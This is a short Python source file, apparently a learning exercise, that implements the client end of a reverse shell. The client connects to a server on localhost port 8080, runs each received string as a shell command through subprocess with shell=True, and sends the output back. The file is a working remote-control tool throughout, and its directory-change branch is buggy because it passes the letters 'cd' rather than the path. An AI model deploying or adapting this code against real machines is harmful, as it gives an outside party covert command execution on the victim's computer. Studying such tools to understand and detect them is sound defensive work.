import socket # BSD (Berkeley Software Distribution) Socket Module
import os # give the module access to the operating system of the client pc
import subprocess # control some processes on the client pc

reverse_client_socket_end = socket.socket() # creation of the client_socket_object

host = "localhost"

port = 8080 # same port as that used in the server's end

reverse_client_socket_end.connect((host, port)) # the address == tuple == (host, port) same as in the bind() in the server's end

while True:
    
    data_from_server = reverse_client_socket_end.recv(1024) # recv the sent data in chunks of 1 KiloByte == 1024 Bytes at a time
    
    if data_from_server[:2].decode(encoding="utf-8", errors="strict") == "cd".lower(): # if the first 2 characters of the entered command in the server's end are "cd" 
        
        os.chdir(data_from_server[:2].decode(encoding="utf-8", errors="strict")) # prompt the operating system of the client to change the directory using the chdir() from the os module
        
    if len(data_from_server) > 0: # if the length of the data_from_server is > 0, if we have received some amount of data
        
        command_received = subprocess.Popen(data_from_server.decode(encoding="utf-8", errors="strict"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        
        output_byte = command_received.stdout.read() + command_received.stderr.read()
        
        output_str = str(output_byte, encoding="utf-8")
        
        current_working_dir = os.getcwd() + "> "
        
        reverse_client_socket_end.send(str.encode(output_str + current_working_dir))
        
        print(output_str)